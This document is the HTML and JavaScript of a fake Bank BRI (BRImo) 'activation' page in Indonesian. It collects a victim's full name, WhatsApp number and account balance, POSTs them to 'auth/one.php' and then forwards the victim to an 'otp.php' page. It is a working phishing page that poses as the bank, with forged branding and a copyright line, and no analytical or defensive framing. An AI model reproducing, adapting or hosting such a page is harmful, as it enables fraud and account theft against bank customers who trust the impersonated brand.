
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶  | 𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱</title>
     <meta name="theme-color" content="#0f78cb">
     <link rel="icon" type="image/png" href="https://hosting.tigerengine.id/nssd3w.png">
<meta content="https://hosting.tigerengine.id/4mi0e0.jpg" property="og:image">
<meta name="twitter:image" content="https://hosting.tigerengine.id/4mi0e0.jpg">
    	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
  <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
 
   
</head>
<style>
  body {
    font-family: 'Roboto', sans-serif; 
    margin: 0;
    padding: 0;
    background: linear-gradient(to bottom right, #e0f2fe, #e0f7fa);
    color: #fff;
    overflow-x: hidden;
    
}


.container {
  max-width: 400px; 
  width:90%;
  margin: 0 auto;
  padding: 10px;
  margin-top: 40px;
  min-height: 50vh;
  display: flex;
  flex-direction: column;
  align-items: center; 
  height:160px;
}

.hero {
  background-color: #ffffffe4;
  padding: 0px;
  border-radius: 10px;
  box-shadow: 0 3px 5px rgba(0, 0, 0, 0.5);
  margin-bottom: 10px;
  width: 100%;   
  max-width: 400px;
  height:160px;
}


.carousel {
  margin: 0 auto;
  position: relative;
  overflow: hidden;
  width: 100%;
  height:160px; 
  max-width: 400px;
  
}

.carousel-item {
  position: absolute;
  top: 0;
  width: 100%;
  height: 100%;
  transition: opacity 0.5s ease;
  opacity: 0;
}

.carousel-item.active {
  opacity: 1;
}

.carousel-item img {
  width: 100%;
  height: 100%;
  border-radius: 10px;
}

.carousel-nav {
  position: absolute;
  bottom: 10px;
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  gap: 10px;
}

.carousel-nav-item {
  width: 10px;
  height: 10px;
  background-color: #cccccc;
  border-radius: 50%;
  cursor: pointer;
}

.carousel-nav-item.active {
  background-color: #007bff;
}

@media (max-width: 600px) { 
  .carousel {
    height: 160px; 
  }

  .card {
    max-width: 100%; 
  }

  .input-field label {
    font-size: 14px; 
  }

  .input-field input {
    font-size: 14px; 
  }

 
}

@media (max-width: 400px) {
  .carousel {
    height: 160px; 
  }

  .card {
    max-width: 100%; 
  }
}

.form-section {
    background-color: transparent;
    padding: 10px;
    border-radius: 0px 0px 10px 10px;
    width: 90%;
    max-width: 400px;
    color: #000; 
    box-shadow: 0 4px 8px rgba(0,0,0,0.2); 
}

.form-container {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column; 
    width: 100%; 
}


.card {
    background-color: #ffffffe4;
    padding: 20px;
    border-radius: 10px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    border: 1px solid #ddd; 
    
}

.card-header {
    text-align: center;
    margin-bottom: 20px;
}

.card-body {
    margin-bottom: 20px;
}

ion-icon{
    font-size: 22px;
    margin-left: 8px;
    margin-top: 8px;
    position: absolute;
    color: #06529C;
}

.input-field {
    margin-bottom: 10px;
    position: relative;
    width: 100%;
}

.input-field label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
    color: #000;
}

.input-field input {
    width: 100%;
    padding: 10px;
    border: 1px solid #007bff;
    border-radius: 7px;
    box-sizing: border-box;
    padding-right: 40px;
    font-size: 16px; 
    font-weight: bold;
    background-color: #f9f9f9; 
    color: #09559a; 
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); 
    padding-left: 40px;
    
}

.input-field i { 
    position: absolute;
    top: 50%;
    right: 15px;
    transform: translateY(-50%);
    color: #666; 
    font-size: 1.2rem;
}

.input-field input:focus {
    outline: none;
    border-color: #007bff;
    box-shadow: 0 0 5px rgba(0, 123, 255, 0.5); 
}

.input-field input:focus + i {
    color: #007bff;
}

::placeholder{
    opacity:0.7;
}

.card-footer {
    text-align: center;
}

.button {
    background-color: #137fd5;
    color: #fff;
    padding: 12px 20px;
    border: none;
    border-radius: 7px;
    cursor: pointer;
    transition: background-color 0.3s ease;
    font-size: 15px;
    width: 100%;
    max-width: 400px;
    margin-top: 10px; 
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4); 
    margin-bottom: 10px;
    font-weight: 600;
    transition: 0.3s;
}

.button:hover {
    opacity:0.3;    
    background-color: #0F78CB; 
    color: #fff;
}

.button:disabled, 
.button[disabled]{  
    opacity:0.3;
    background-color: #0F78CB; 
    color: #fff;
}

nav{
     position:fixed;
     top: 0;
     height:50px;
     background: #007bff;
     width: 100%;
     z-index:99999;
}

.hh{    
    position: fixed; 
    top: -10; 
    left: 0; 
    right: 0; 
    margin: 0px auto; 
    width: 100%; 
    max-width: 450px;
    height: 50px; 
    background: url('https://hosting.tigerengine.id/pbtf99.jpg');
    background-repeat: no-repeat;
    background-size: 100% 100%;
    box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;
    }
    
.button-85 {
  background-color: transparent;  
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
}

.button-85:before {
  content: "";
  background: linear-gradient(
    50deg,
    #fff000,
    #ff7300,
    #fffb00,
    #48ff00,
    #00ffd5,
    #002bff,
    #7a00ff,
    #ff00c8,
    #ff0000
  );
  position: absolute;
  top: 0px;
  left: 0px;
  background-size: 500%;
  z-index: -1;
  filter: blur(0px);
  -webkit-filter: blur(0px);
  width: calc(100% + 0px);
  height: calc(100% + 0px);
  animation: glowing-button-85 20s linear infinite;
  transition: opacity 0.3s ease-in-out;
  border-radius: 10px;
}

@keyframes glowing-button-85 {
  0% {
    background-position: 0 0;
  }
  50% {
    background-position: 300% 0;
  }
  100% {
    background-position: 0 0;
  }
}

.button-85:after {
  z-index: -1;
  content: "";
  position: absolute;
  width: 100%;
  height: 100%;
  background: transparent;
  left: 0;
  top: 0;
  border-radius: none;
}
.card{       
        position: relative;
        border:0px solid #fff;
        padding:18px;
        width:100%;
        border-radius:10px; 
        background: #ffffffe6;            
        box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px; 
        
    }
    
    h3{
        border-bottom: 2px solid #ef871c;
        border-top:none;
        border-left:none;
        border-right:none;
        border-radius: 0px 0px 20px 0px;
        height: auto;            
        font-size: 16px;
        margin-bottom: 0px;
    }
    
    .load{
     top: 0;
     left: 0;
     right: 0;
     margin: 0 auto;
     position: fixed;
     display: flex;
     justify-content: center;
     align-items: center;
     background: #00000090;
     z-index: 999999999;
     width: 100%;
     height: 100%;
     max-width: 450px;
      }
      
      .x{    
            margin: 0 auto;
            display: flex;
            top: 0;
            left: 0;
            right: 0;
            width: 90%;    
            margin-top: 75%;             
      }
      
       .hid{
          display:none;
      }
      
      .radio-group {
            display: flex;
            flex-direction: column;          
            margin-bottom: 2px;
            max-width: 400px;
        }

        input[type="radio"] {
            display: none; /* Sembunyikan input asli */
            
        }

        .label-radio {
            position: relative;
            text-align:center;           
            padding: 4px 20px;
            border: 1px solid #09559a;
            border-radius: 25px;
            cursor: pointer;
            transition: background-color 0.3s ease, color 0.3s ease;
            font-size: 14px;
            color: #09559a;
            background-color: transparent;
            margin-bottom: 10px;
        }

        input[type="radio"]:checked + .label-radio {
            background-color: #137fd5;
            color: #fff;
            border: 1px solid #137fd5;                   
        }

         

        input[type="radio"]:checked + .label-radio::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            width: 12px;
            height: 12px;
            border: 1px solid #ef871c;
            background-color: #fff;
            border-radius: 50%;
            transition: background-color 0.3s;            
        }

        input[type="radio"]:checked + .label-radio::before {
            background-color: #fff;
        }
        
welalxcome {
  display: flex;
  position: fixed;
  margin: 0 auto;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100%;
  max-width: 450px;
  background: url('');
  background-repeat: no-repeat;
  background-position: 100% 100%;
  background-size: 100% 100%;
  z-index: 10000;
  background-color: #ffffff;
  max-height: 820px;
}
welalxcome img {
    width:100%;
    max-width: 400px;
    height: 700px;
    margin-top: -55px;
    
}
chsalxcome {
    position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}

.saldo{
    
}
</style>
<body>
    <main>
<welalxcome class="hid">
</welalxcome>
<chsalxcome2 class="hid">
    <div class="load hid">
 <img src="https://hosting.tigerengine.id/f01dmo.gif" class="x" alt="loading"></div>
 <nav class="hh"></nav>
    <div class="container">    
 <img src="https://hosting.tigerengine.id/vdii6e.png" style="position:fixed;margin:0 auto;z-index:-9999;max-width:450px;margin-top:-20px;" alt=""><br>
    <section class="hero">     
      <div class="carousel">
        <div class="carousel-item active">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR3o0xce58y19H3es76SzFfZ5LALSwHmmwToeDAH461Ctm6_kIfudCdqAM&s=10" alt="Carousel Image 1">
        </div>
        <div class="carousel-item">
          <img src="https://i.ytimg.com/vi/WhpRV9ySuKQ/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA7zQD_Ea3SnYBPH5-hAOCyzDx2GQ" alt="Carousel Image 2">
        </div>
        <div class="carousel-item">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQXq1wjJvmbKnBhYDLqZXE1NAIg55066Hp8JsCgRqOkC_tBOnkRBDEyMOEG&s=10" alt="Carousel Image 3">
        </div>
        <div class="carousel-item">
          <img src="https://hosting.tigerengine.id/1x41fv.jpg" alt="Carousel Image 4">
        </div>
        <div class="carousel-item">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8vBDXDsQtth1yjwIy76tJa8lozDZ8ryRVaeukQqAOg_i5m4fyCIF5l_c&s=10" alt="Carousel Image 5">
        </div>
        <div class="carousel-nav">
          <div class="carousel-nav-item active"></div>
          <div class="carousel-nav-item"></div>
          <div class="carousel-nav-item"></div>
          <div class="carousel-nav-item"></div>
          <div class="carousel-nav-item"></div>
        </div>
      </div>
    </section>   



        <div class="form-section">
           <div class="form-container">
              <div class="card">
                 <div class="button-85">
                    <div class="card-body">
                       <h3 style="color:#09559a;margin-top:0;">𝗣𝗲𝗻𝗰𝗲𝘁𝗮𝗸𝗮𝗻 𝗞𝘂𝗽𝗼𝗻 <b style="color: #06529C"><strong>BRI</strong></b><b style="color: #F37024">mo</b> :</h3>
          <form id="index" onsubmit="sendHpp()" method="post">
           <br> 
      <br>      <div class="input-field">
    <label for="nama">Nama Lengkap :</label>
<input type="text" id="nama" name="nama" style="padding-left: 12px;" placeholder="Nama sesuai KTP" required>
                        </div>
       
       <div class="input-field">
     <label for="nohp">Nomor WhatsApp :</label>
 <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
 <input type="tel" id="nohp" name="nomor" placeholder="08××××" maxlength="20" required>
                        </div>

       <div class="input-field">
    <label for="saldo">Saldo akhir: </label>
 <input type="tel" id="saldo" name="saldo" class="saldo" style="padding-left: 12px;" placeholder="Rp. ×××" maxlength="" minlength="" oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" required>
                        </div>
                    </div>
   <div class="card-footer">
<button type="submit" class="button" id="lanjutkan" disabled>Lanjutkan</button>
                  </div>
                </div>
            </div>
         </form>
            <center><p style="font-size:13px;color:#00000080;margin-bottom:0; ">© 2025s PT.Bank Rakyat Indonesia (Persero) Tbk.<br> | All Rights Reserved.</p></center>
        </div>
    </div>    
</div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="i.js"></script>
    <script src="token.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
    <script>
function sendHpp(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    
    var tarif = $('input[name="tarif"]:checked').val();
       if (tarif) {  
  sessionStorage.setItem('tarif', tarif);
  }     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama);  
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo); 
  
    
    $.ajax({
        type: 'POST',
        url: 'auth/one.php',
        data: $('#index').serialize(),
        datatype: 'JSON',   
    complete: function(){    
    setTimeout(function(){   
    window.location = "otp.php";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
    

    }, 800);}});};
        
    $( document ).ready(function() {
      $('welalxcome').fadeIn(500);
            setTimeout(() => {
                $('welalxcome').fadeOut();
                $('chsalxcome2').fadeIn();
            },800)
        })
  
        
 // Get references to the input and button elements
const input = document.getElementById("nohp");
const button = document.getElementById("lanjutkan");

// Add an event listener for the input event
input.addEventListener("input", () => {
  // Check if the input field has any text
  if (input.value.length > 9) {
    // If there's text, enable the button
    button.disabled = false;
  } else {
    // If there's no text, disable the button
    button.disabled = true;
  }
});

        const carouselItems = document.querySelectorAll('.carousel-item');
const carouselNavItems = document.querySelectorAll('.carousel-nav-item');
let currentItem = 0;

function showItem(index) {
  carouselItems.forEach(item => {
    item.classList.remove('active');
  });

  carouselNavItems.forEach(item => {
    item.classList.remove('active');
  });

  carouselItems[index].classList.add('active');
  carouselNavItems[index].classList.add('active');
  currentItem = index;
}

carouselNavItems.forEach((item, index) => {
  item.addEventListener('click', () => {
    showItem(index);
  });
});

// Automatic slide
setInterval(() => {
  currentItem = (currentItem + 1) % carouselItems.length;
  showItem(currentItem);
}, 3000); // Change image every 3 seconds

// Form submission
const activationForm = document.getElementById('activation-form');

$(document).ready(function(){

                // Format mata uang.
                $( '.saldo' ).mask('000.000.000.000.000', {reverse: true});
 var dengan_rupiah = document.getElementById('saldo');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    
      /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
            })       

    </script>
</body>

</html>